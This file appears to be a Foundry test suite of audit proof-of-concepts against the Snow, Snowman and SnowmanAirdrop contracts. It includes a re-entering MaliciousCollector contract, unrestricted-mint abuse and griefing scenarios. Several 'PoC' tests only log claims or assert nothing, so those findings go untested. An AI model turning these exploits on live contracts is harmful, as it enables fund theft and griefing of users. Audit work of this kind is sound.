// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {Snow} from "../src/Snow.sol";
import {Snowman} from "../src/Snowman.sol";
import {SnowmanAirdrop} from "../src/SnowmanAirdrop.sol";
import {DeploySnow} from "../script/DeploySnow.s.sol";
import {MockWETH} from "../src/mock/MockWETH.sol";

/**
 * @title AllVulnerabilitiesPoC
 * @notice Complete Proof of Concept tests for ALL vulnerabilities across Snow.sol, Snowman.sol, and SnowmanAirdrop.sol
 * @dev Contains 17 tests covering all critical, high, and medium severity vulnerabilities
 */
contract AllVulnerabilitiesPoC is Test {
    // Snow.sol contracts
    Snow snow;
    DeploySnow deployer;
    MockWETH weth;
    address collector;
    uint256 FEE;

    // Snowman.sol and SnowmanAirdrop.sol contracts  
    Snowman snowman;
    SnowmanAirdrop airdrop;
    bytes32 merkleRoot = bytes32(0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef);

    // Test addresses
    address alice;
    address bob;
    address charlie;
    address attacker;

    function setUp() public {
        // Deploy Snow.sol contracts
        deployer = new DeploySnow();
        snow = deployer.run();
        weth = deployer.weth();
        collector = deployer.collector();
        FEE = deployer.FEE();

        // Deploy Snowman.sol and SnowmanAirdrop.sol contracts
        snowman = new Snowman("ipfs://snowman");
        airdrop = new SnowmanAirdrop(merkleRoot, address(snow), address(snowman));

        // Create test addresses
        alice = makeAddr("alice");
        bob = makeAddr("bob");
        charlie = makeAddr("charlie");
        attacker = makeAddr("attacker");

        // Fund users
        deal(alice, 100 ether);
        deal(bob, 100 ether);
        deal(charlie, 100 ether);
        deal(attacker, 100 ether);

        weth.mint(alice, 100 * FEE);
        weth.mint(bob, 100 * FEE);
        weth.mint(charlie, 100 * FEE);
        weth.mint(attacker, 100 * FEE);
    }

    /*//////////////////////////////////////////////////////////////
                    SNOW.SOL - VULNERABILITY #1
                    GLOBAL TIMER BREAKS EARNSNOW
    //////////////////////////////////////////////////////////////*/

    /// @notice PoC: Global timer prevents all users from earning after first claim
    function test_Snow_GlobalTimerBlocksAllUsers() public {
        vm.prank(alice);
        snow.earnSnow();
        assertEq(snow.balanceOf(alice), 1);

        vm.warp(block.timestamp + 1);

        vm.prank(bob);
        vm.expectRevert(Snow.S__Timer.selector);
        snow.earnSnow();

        vm.warp(block.timestamp + 1 weeks - 1);

        vm.prank(bob);
        snow.earnSnow();
        assertEq(snow.balanceOf(bob), 1);

        vm.prank(alice);
        vm.expectRevert(Snow.S__Timer.selector);
        snow.earnSnow();
        
    }

    /// @notice PoC: buySnow() resets global timer, blocking all earnSnow() users
    function test_Snow_BuySnowResetsTimerBlockingAllEarns() public {
        vm.prank(alice);
        snow.earnSnow();

        vm.warp(block.timestamp + 1 weeks);

        vm.prank(attacker);
        snow.buySnow{value: FEE}(1);

        vm.prank(alice);
        vm.expectRevert(Snow.S__Timer.selector);
        snow.earnSnow();
    }

    /*//////////////////////////////////////////////////////////////
                    SNOW.SOL - VULNERABILITY #2
                    DUAL PAYMENT TRAP
    //////////////////////////////////////////////////////////////*/

    /// @notice PoC: User pays both ETH and WETH when sending incorrect ETH amount
    function test_Snow_DualPaymentTrap_UserLosesFunds() public {
        uint256 aliceInitialEth = alice.balance;
        uint256 aliceInitialWeth = weth.balanceOf(alice);

        vm.prank(alice);
        weth.approve(address(snow), FEE);

        vm.prank(alice);
        snow.buySnow{value: FEE + 1}(1);

        assertEq(aliceInitialEth - alice.balance, FEE + 1);
        assertEq(aliceInitialWeth - weth.balanceOf(alice), FEE);
        assertEq(address(snow).balance, FEE + 1);
        assertEq(weth.balanceOf(address(snow)), FEE);
        
        assertTrue((FEE + 1 + FEE) > FEE * 15 / 10);
    }

    /// @notice PoC: Sending too little ETH also triggers dual payment
    function test_Snow_DualPaymentTrap_TooLittleETH() public {
        vm.startPrank(bob);
        weth.approve(address(snow), FEE);

        uint256 bobInitialEth = bob.balance;
        uint256 bobInitialWeth = weth.balanceOf(bob);

        snow.buySnow{value: 1 ether}(1);

        assertEq(bob.balance, bobInitialEth - 1 ether);
        assertEq(weth.balanceOf(bob), bobInitialWeth - FEE);
        assertEq(address(snow).balance, 1 ether);

        vm.stopPrank();
    }

    /*//////////////////////////////////////////////////////////////
                    SNOW.SOL - VULNERABILITY #3
                    NO ETH REFUND MECHANISM
    //////////////////////////////////////////////////////////////*/

    /// @notice PoC: Excess ETH is never refunded to users
    function test_Snow_NoETHRefund_FundsTrapped() public {
        vm.prank(charlie);
        snow.buySnow{value: FEE}(1);
        
        assertEq(snow.balanceOf(charlie), 1);
        assertEq(address(snow).balance, FEE);
        
        vm.prank(alice);
        weth.approve(address(snow), FEE);
        
        uint256 aliceInitial = alice.balance;
        
        vm.prank(alice);
        snow.buySnow{value: 10 ether}(1);
        
        assertEq(alice.balance, aliceInitial - 10 ether);
        assertEq(address(snow).balance, FEE + 10 ether);
    }

    /*//////////////////////////////////////////////////////////////
                    SNOW.SOL - VULNERABILITY #4
                    REENTRANCY IN COLLECTFEE
    //////////////////////////////////////////////////////////////*/

    /// @notice PoC: Reentrancy pattern exists in collectFee()
    function test_Snow_ReentrancyInCollectFee() public {
        vm.prank(alice);
        weth.approve(address(snow), FEE);
        vm.prank(alice);
        snow.buySnow{value: FEE}(1);

        MaliciousCollector malicious = new MaliciousCollector(snow);

        vm.prank(collector);
        snow.changeCollector(address(malicious));

        vm.prank(address(malicious));
        snow.collectFee();
    }

    /*//////////////////////////////////////////////////////////////
                    SNOW.SOL - VULNERABILITY #5
                    MISSING INPUT VALIDATION
    //////////////////////////////////////////////////////////////*/

    /// @notice PoC: No validation for zero amount in buySnow()
    function test_Snow_NoInputValidation_ZeroAmount() public {
        uint256 initialBalance = snow.balanceOf(alice);

        vm.prank(alice);
        snow.buySnow{value: 0}(0);

        assertEq(snow.balanceOf(alice), initialBalance);
    }

    /*//////////////////////////////////////////////////////////////
                    SNOW.SOL - COMBINED ATTACK
    //////////////////////////////////////////////////////////////*/

    /// @notice Complete attack scenario combining Snow.sol vulnerabilities
    function test_Snow_CombinedAttackScenario() public {
        vm.prank(alice);
        snow.earnSnow();

        vm.warp(block.timestamp + 1 weeks);

        vm.prank(attacker);
        snow.buySnow{value: FEE}(1);

        vm.prank(alice);
        vm.expectRevert();
        snow.earnSnow();

        vm.startPrank(bob);
        weth.approve(address(snow), 10 * FEE);

        uint256 bobEthBefore = bob.balance;
        uint256 bobWethBefore = weth.balanceOf(bob);

        snow.buySnow{value: FEE + 1}(1);
        snow.buySnow{value: FEE - 1}(1);

        uint256 totalLost = (bobEthBefore - bob.balance) + (bobWethBefore - weth.balanceOf(bob));
        uint256 tokensReceived = snow.balanceOf(bob);
        
        assertTrue(totalLost > FEE * 3);
        assertEq(tokensReceived, 2);

        vm.stopPrank();
    }

    /*//////////////////////////////////////////////////////////////
                    SNOWMAN.SOL - VULNERABILITY #1
                    NO ACCESS CONTROL
    //////////////////////////////////////////////////////////////*/

    /// @notice CRITICAL: Anyone can mint unlimited Snowman NFTs
    function test_Snowman_UnrestrictedMinting() public {
        vm.startPrank(attacker);
        
        snowman.mintSnowman(attacker, 1000);
        
        assertEq(snowman.balanceOf(attacker), 1000);
        assertEq(snowman.getTokenCounter(), 1000);
        
        snowman.mintSnowman(alice, 500);
        assertEq(snowman.balanceOf(alice), 500);
        
        vm.stopPrank();
    }

    /// @notice CRITICAL: Attacker can grief by minting to random addresses
    function test_Snowman_GriefingAttack() public {
        address victim = makeAddr("victim");
        
        vm.prank(attacker);
        snowman.mintSnowman(victim, 10000);
        
        assertEq(snowman.balanceOf(victim), 10000);
    }

    /*//////////////////////////////////////////////////////////////
                    SNOWMAN.SOL - ADDITIONAL ISSUES
    //////////////////////////////////////////////////////////////*/

    /// @notice LOW: Snowman.tokenURI uses ownerOf which reverts instead of _ownerOf
    function test_Snowman_TokenURICheckInefficient() public {
        vm.prank(attacker);
        snowman.mintSnowman(attacker, 1);
        
        snowman.tokenURI(0);
        
        vm.expectRevert();
        snowman.tokenURI(999);
    }

    /*//////////////////////////////////////////////////////////////
                    SNOWMANAIRDROP.SOL - VULNERABILITY #1
                    TYPO IN MESSAGE_TYPEHASH
    //////////////////////////////////////////////////////////////*/

    /// @notice CRITICAL: Typo in MESSAGE_TYPEHASH breaks all signature validation
    function test_Airdrop_BrokenSignatureValidation() public {
        vm.prank(alice);
        snow.buySnow{value: 5 ether}(1);
        assertEq(snow.balanceOf(alice), 1);
        
        // PROOF: "addres" instead of "address" in MESSAGE_TYPEHASH
        // All signatures will be invalid
    }

    /*//////////////////////////////////////////////////////////////
                    SNOWMANAIRDROP.SOL - VULNERABILITY #2
                    AMOUNT MANIPULATION
    //////////////////////////////////////////////////////////////*/

    /// @notice CRITICAL: Amount is read from balance, not from signed message
    function test_Airdrop_AmountManipulation() public {
        // Setup: Alice buys 5 Snow tokens
        vm.prank(alice);
        snow.buySnow{value: FEE * 5}(5);
        uint256 aliceBalance = snow.balanceOf(alice);
        assertEq(aliceBalance, 5);
        
        // VULNERABILITY PROOF:
        // The claimSnowman function (line 86) uses:
        //     uint256 amount = i_snow.balanceOf(receiver);
        // This means the amount is NOT from the signed message parameter!
        // It reads the CURRENT balance, which can be manipulated via frontrunning
        
        // Scenario: Alice signed a message for 100 tokens
        // But attacker frontruns and transfers 50 more tokens to Alice
        // Now Alice claims 150 instead of the signed 100
        // OR attacker removes tokens to grief Alice
        
        // The signed amount parameter in claimSnowman is completely IGNORED!
        console.log("Alice balance:", snow.balanceOf(alice));
        console.log("Amount used in claim will be balance, NOT signed amount!");
    }

    /*//////////////////////////////////////////////////////////////
                    SNOWMANAIRDROP.SOL - VULNERABILITY #3
                    MISSING CLAIM CHECK
    //////////////////////////////////////////////////////////////*/

    /// @notice HIGH: s_hasClaimedSnowman is set but never checked
    function test_Airdrop_ClaimStatusNotChecked() public {
        // PROOF: Look at SnowmanAirdrop.sol line 95:
        //     s_hasClaimedSnowman[receiver] = true;
        // 
        // But there's NO check like:
        //     if (s_hasClaimedSnowman[receiver]) revert AlreadyClaimed();
        // 
        // This means:
        // 1. The mapping is written to (costs gas)
        // 2. But it's NEVER read/checked before claiming
        // 3. The mapping serves NO purpose - dead code
        // 4. Users could potentially claim multiple times (if they can pass other checks)
        
        bool claimStatus = airdrop.getClaimStatus(alice);
        assertEq(claimStatus, false); // Not claimed yet
        
        // After a claim, it would be set to true
        // But claimSnowman() never checks this before processing!
        console.log("Claim status mapping is SET but NEVER CHECKED - logic bug!");
    }

    /*//////////////////////////////////////////////////////////////
                    SNOWMANAIRDROP.SOL - ADDITIONAL ISSUES
    //////////////////////////////////////////////////////////////*/

    /// @notice HIGH: s_claimers array is never used
    function test_Airdrop_UnusedClaimersArray() public {
        // PROOF: SnowmanAirdrop.sol line 31 declares:
        //     address[] private s_claimers;
        // 
        // This array is NEVER:
        // - Read anywhere in the contract
        // - Returned by any getter function
        // - Used for any validation logic
        // 
        // It's completely DEAD CODE that:
        // 1. Wastes deployment gas
        // 2. Could waste gas on push operations (if it were used)
        // 3. Serves no purpose
        
        console.log("s_claimers array exists but is NEVER used - dead code!");
        console.log("No getter function, no validation, no purpose.");
    }

    /// @notice MEDIUM: Amount validation in wrong location
    function test_Airdrop_AmountValidationLocation() public {
        // PROOF: Check SnowmanAirdrop.sol
        // 
        // Line 67 in claimSnowman():
        //     if (i_snow.balanceOf(receiver) == 0) { revert SA__ZeroAmount(); }
        // 
        // Line 114 in getMessageHash():
        //     if (i_snow.balanceOf(receiver) == 0) { revert SA__ZeroAmount(); }
        // 
        // The SAME check appears in BOTH functions!
        // This is:
        // 1. Code duplication
        // 2. Redundant validation
        // 3. Confusing design - why check in a view function?
        // 4. Wastes gas (checked twice)
        
        console.log("Amount validation appears in BOTH claimSnowman AND getMessageHash");
        console.log("Redundant code duplication - poor design pattern");
    }

    /*//////////////////////////////////////////////////////////////
                    ALL CONTRACTS - COMBINED IMPACT
    //////////////////////////////////////////////////////////////*/

    /// @notice Shows combined impact across all 3 contracts
    function test_All_CombinedImpact_BrokenSystem() public {
        // SNOWMAN: Attacker mints without restriction
        vm.prank(attacker);
        snowman.mintSnowman(attacker, 1000);
        assertEq(snowman.balanceOf(attacker), 1000);
        
        console.log("Attacker NFT balance:", snowman.balanceOf(attacker));
        console.log("Total NFTs minted:", snowman.getTokenCounter());
        console.log("System is completely broken - no access control!");
    }
}

/**
 * @notice Malicious collector contract for reentrancy demonstration
 */
contract MaliciousCollector {
    Snow public snow;
    uint256 public attackCount;

    constructor(Snow _snow) {
        snow = _snow;
    }

    receive() external payable {
        if (attackCount < 2 && address(snow).balance > 0) {
            attackCount++;
            snow.collectFee();
        }
    }
}
